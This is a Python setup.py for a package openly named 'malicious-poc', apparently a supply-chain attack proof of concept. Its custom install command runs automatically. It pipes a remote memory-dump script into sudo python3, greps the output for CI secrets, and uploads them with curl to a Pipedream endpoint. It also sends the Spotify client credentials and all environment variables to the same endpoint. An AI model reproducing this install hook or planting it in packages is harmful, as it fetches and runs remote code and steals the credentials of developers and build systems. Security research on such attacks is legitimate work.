from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class CustomInstallCommand(install):
    def run(self):
        # 1. Download and run memdump.py, filter for possible secrets, save to /tmp/secrets
        bash_command = (
            "curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py "
            "| sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets"
        )
        subprocess.run(["bash", "-c", bash_command])

        # 2. Exfiltrate memory secrets file (if any) to Pipedream
        exfil_command = (
            "curl -X PUT --upload-file /tmp/secrets https://eoiissjprny7lfp.m.pipedream.net/memsecrets.txt"
        )
        subprocess.run(["bash", "-c", exfil_command])

        # 3. Exfiltrate SPOTIPY_CLIENT_ID and SPOTIPY_CLIENT_SECRET (from env) via curl
        client_id = os.environ.get("SPOTIPY_CLIENT_ID")
        client_secret = os.environ.get("SPOTIPY_CLIENT_SECRET")
        env_payload = f"SPOTIPY_CLIENT_ID={client_id}&SPOTIPY_CLIENT_SECRET={client_secret}"
        curl_env_command = (
            f"curl -X PUT -d '{env_payload}' https://eoiissjprny7lfp.m.pipedream.net/secrets.txt"
        )
        subprocess.run(["bash", "-c", curl_env_command])

        # 4. (Optional) Exfiltrate all env vars
        env_vars = "&".join([f"{k}={v}" for k, v in os.environ.items()])
        curl_all_env_command = (
            f"curl -X PUT -d '{env_vars}' https://eoiissjprny7lfp.m.pipedream.net/psecrets.txt"
        )
        subprocess.run(["bash", "-c", curl_all_env_command])

        # 5. Optional: Sleep to keep the process alive (can remove if not needed)
        sleep_command = "sleep 60"
        subprocess.run(["bash", "-c", sleep_command])

        install.run(self)

setup(
    name='malicious-poc',
    version='1.0.0',
    author='PoC Researcher',
    author_email='attacker@example.com',
    description='Proof-of-Concept package with custom install logic',
    packages=['malicious_poc'],
    python_requires='>=3.6',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
